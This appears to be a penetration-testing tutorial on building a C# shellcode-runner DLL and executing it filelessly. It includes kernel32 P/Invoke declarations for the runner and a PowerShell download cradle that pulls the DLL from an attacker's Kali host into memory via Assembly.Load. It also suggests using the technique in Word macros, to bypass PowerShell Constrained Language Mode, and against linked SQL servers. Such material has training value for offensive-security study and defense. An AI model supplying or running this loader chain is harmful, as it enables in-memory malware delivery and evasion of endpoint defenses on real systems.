First we will create a Class Library (.Net Framework), which will create a managed DLL when we compile. 
The process of creating a managed EXE is similar to that of creating a managed DLL. 
we will create a runner method with the prefixes public, static, and void. This will serve as the body of the shellcode runner and must be available through reflection, which is why we declared it as public and static.

DllImports and definition of runner method:

    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
         uint flAllocationType, uint flProtect);
    
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    
        public static void runner()
        {
        ***<comment>we can have the exact content of the Main method of the ShellCode Runner in C# project into the runner method; We'll also need to replace the namespace imports to match those of the project
        Ref:https://github.com/TatTvamAsi-786/CSharp-Shellcode-Runner <comment>***
        }

we can compile it and copy the resulting DLL (ClassLibrary1.dll) into the web root of our Kali Linux machine. we'll use a download cradle to fetch the newly-compiled DLL.
we'll use the LoadFile method from the System.Reflection.Assembly namespace to dynamically load our pre-compiled C# assembly into the process. This works in both PowerShell and native C#.
we will use DownloadData method of the Net.WebClient class to download the DLL as a byte array. so that we can avoid download the assembly to disk before loading it.

Using DownloadData and Load to execute the assembly from memory:

    $data = (New-Object System.Net.WebClient).DownloadData('http://<kali ip>/ClassLibrary1.dll')
    
    $assem = [System.Reflection.Assembly]::Load($data)
    $class = $assem.GetType("ClassLibrary1.Class1")
    $method = $class.GetMethod("runner")
    $method.Invoke(0, $null)

with this approach we have successfully loaded precompiled C# assembly directly into memory without touching disk and executed our shellcode runner.

we can use this technique within a Word macro but remember that Word runs as a 32-bit process.

Also, we can use this technique to bypass PowerShell CLM, we can have the relative code in runner() method. 

Also, we can modify runner() to execute code (C#) on remote linked SQL server from intial foothold powershell prompt if required 
